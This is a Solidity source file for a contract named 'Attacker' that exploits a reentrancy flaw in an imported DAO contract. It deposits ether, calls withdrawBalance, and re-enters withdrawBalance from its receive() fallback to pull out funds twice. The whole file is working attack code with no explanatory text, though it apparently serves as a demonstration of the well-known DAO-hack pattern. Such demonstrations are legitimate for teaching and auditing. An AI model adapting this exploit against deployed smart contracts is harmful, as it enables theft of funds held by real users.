pragma solidity ^0.6.2;

import "./DAO.sol";

contract Attacker {
    bool attack;
    DAO dao;

    constructor(address _daoAddress) public {
        dao = DAO(_daoAddress);
    }

    receive() external payable {
        if (attack) {
            attack = false;
            dao.withdrawBalance();
        }
    }

    function deposit() external payable {
        dao.addToBalance.value(address(this).balance)();
    }

    function withdraw() external {
        attack = true;
        dao.withdrawBalance();
    }
}
